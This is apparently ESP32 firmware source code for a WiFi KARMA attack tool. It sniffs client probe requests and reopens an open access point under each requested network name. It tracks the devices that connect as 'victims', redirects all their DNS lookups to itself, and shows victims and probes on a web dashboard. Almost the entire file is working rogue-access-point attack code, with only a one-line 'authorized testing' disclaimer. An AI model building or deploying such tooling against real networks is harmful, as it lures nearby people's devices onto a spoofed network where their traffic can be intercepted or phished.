/*
 * WiFi Karma Attack - ESP32 Firmware
 * Demonstrates the KARMA attack by responding to client probe requests
 * with matching SSIDs, testing if devices auto-connect to spoofed networks.
 * FOR AUTHORIZED SECURITY TESTING ONLY.
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>

#define STATUS_LED   2
#define MAX_PROBES   64
#define MAX_VICTIMS  16

struct ProbeRequest {
    uint8_t mac[6];
    char ssid[33];
    int8_t rssi;
    uint32_t timestamp;
    bool responded;
};

struct VictimClient {
    uint8_t mac[6];
    char connectedSSID[33];
    IPAddress ip;
    uint32_t connectTime;
    uint32_t httpRequests;
};

ProbeRequest probeLog[MAX_PROBES];
VictimClient victims[MAX_VICTIMS];
int probeCount = 0;
int victimCount = 0;
bool karmaEnabled = false;
char currentSSID[33] = "Free_WiFi";

WebServer server(80);
DNSServer dnsServer;

const char* CONTROL_SSID = "Karma-Control";
const char* CONTROL_PASS = "research2024";

void setup() {
    Serial.begin(115200);
    Serial.println("[KARMA] WiFi Karma Attack Tester Starting");
    pinMode(STATUS_LED, OUTPUT);

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(CONTROL_SSID, CONTROL_PASS);
    Serial.printf("[NET] Control AP: %s @ %s\n", CONTROL_SSID,
                  WiFi.softAPIP().toString().c_str());

    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probeCallback);

    // Captive portal DNS
    dnsServer.start(53, "*", WiFi.softAPIP());

    setupRoutes();
    server.begin();
    blinkLED(3, 150);
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();

    // Check for new connections
    static unsigned long lastCheck = 0;
    if (millis() - lastCheck > 2000) {
        lastCheck = millis();
        checkNewConnections();
    }
}

void blinkLED(int n, int ms) {
    for (int i = 0; i < n; i++) {
        digitalWrite(STATUS_LED, HIGH); delay(ms);
        digitalWrite(STATUS_LED, LOW); delay(ms);
    }
}

void probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    uint16_t fc = frame[0] | (frame[1] << 8);
    uint8_t subtype = (fc >> 4) & 0x0F;

    if (subtype != 4) return;  // Not a probe request

    int idx = probeCount % MAX_PROBES;
    ProbeRequest* pr = &probeLog[idx];
    memcpy(pr->mac, &frame[10], 6);
    pr->rssi = pkt->rx_ctrl.rssi;
    pr->timestamp = millis() / 1000;
    pr->responded = false;

    // Extract SSID
    int pos = 24;
    int frameLen = pkt->rx_ctrl.sig_len;
    if (pos < frameLen && frame[pos] == 0 && frame[pos + 1] > 0) {
        int ssidLen = min((int)frame[pos + 1], 32);
        memcpy(pr->ssid, &frame[pos + 2], ssidLen);
        pr->ssid[ssidLen] = '\0';
    } else {
        strcpy(pr->ssid, "<broadcast>");
        probeCount++;
        return;
    }

    probeCount++;

    if (karmaEnabled && strlen(pr->ssid) > 0 && strcmp(pr->ssid, "<broadcast>") != 0) {
        // Respond by changing our SSID to match the probe
        respondToProbe(pr);
    }

    Serial.printf("[PROBE] %02X:%02X:%02X:%02X:%02X:%02X -> '%s' RSSI:%d\n",
                  pr->mac[0], pr->mac[1], pr->mac[2],
                  pr->mac[3], pr->mac[4], pr->mac[5],
                  pr->ssid, pr->rssi);
}

void respondToProbe(ProbeRequest* pr) {
    // Temporarily change SSID to match probe (KARMA technique)
    strncpy(currentSSID, pr->ssid, 32);
    currentSSID[32] = '\0';
    WiFi.softAP(currentSSID);  // Open network matching request
    pr->responded = true;
    Serial.printf("[KARMA] Responding as '%s'\n", currentSSID);
    blinkLED(1, 50);
}

void checkNewConnections() {
    wifi_sta_list_t staList;
    esp_wifi_ap_get_sta_list(&staList);

    for (int i = 0; i < staList.num; i++) {
        wifi_sta_info_t sta = staList.sta[i];
        // Check if already tracked
        bool found = false;
        for (int j = 0; j < victimCount; j++) {
            if (memcmp(victims[j].mac, sta.mac, 6) == 0) {
                found = true;
                break;
            }
        }
        if (!found && victimCount < MAX_VICTIMS) {
            VictimClient* v = &victims[victimCount];
            memcpy(v->mac, sta.mac, 6);
            strncpy(v->connectedSSID, currentSSID, 32);
            v->connectTime = millis() / 1000;
            v->httpRequests = 0;
            victimCount++;
            Serial.printf("[VICTIM] New client: %02X:%02X:%02X:%02X:%02X:%02X on '%s'\n",
                          sta.mac[0], sta.mac[1], sta.mac[2],
                          sta.mac[3], sta.mac[4], sta.mac[5], currentSSID);
        }
    }
}

void setupRoutes() {
    server.on("/", HTTP_GET, []() {
        String html = "<html><head><title>KARMA Attack Tester</title></head><body>";
        html += "<h1>WiFi KARMA Attack Lab</h1>";
        html += "<p>KARMA: <b>" + String(karmaEnabled ? "ENABLED" : "DISABLED") + "</b> ";
        html += "<a href='/toggle'>[Toggle]</a></p>";
        html += "<p>Current SSID: " + String(currentSSID) + "</p>";

        html += "<h2>Victims (" + String(victimCount) + ")</h2><table border='1'>";
        html += "<tr><th>MAC</th><th>SSID</th><th>Connected</th></tr>";
        for (int i = 0; i < victimCount; i++) {
            char mac[18];
            snprintf(mac, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                     victims[i].mac[0], victims[i].mac[1], victims[i].mac[2],
                     victims[i].mac[3], victims[i].mac[4], victims[i].mac[5]);
            html += "<tr><td>" + String(mac) + "</td><td>" +
                    String(victims[i].connectedSSID) + "</td><td>" +
                    String(victims[i].connectTime) + "s</td></tr>";
        }
        html += "</table>";

        html += "<h2>Probe Log (" + String(probeCount) + ")</h2><pre>";
        int start = max(0, probeCount - 20);
        for (int i = start; i < probeCount; i++) {
            int idx = i % MAX_PROBES;
            char line[120];
            snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X '%s' %d %s\n",
                     probeLog[idx].mac[0], probeLog[idx].mac[1], probeLog[idx].mac[2],
                     probeLog[idx].mac[3], probeLog[idx].mac[4], probeLog[idx].mac[5],
                     probeLog[idx].ssid, probeLog[idx].rssi,
                     probeLog[idx].responded ? "KARMA" : "");
            html += line;
        }
        html += "</pre></body></html>";
        server.send(200, "text/html", html);
    });

    server.on("/toggle", HTTP_GET, []() {
        karmaEnabled = !karmaEnabled;
        if (!karmaEnabled) WiFi.softAP(CONTROL_SSID, CONTROL_PASS);
        server.sendHeader("Location", "/"); server.send(302);
    });
}
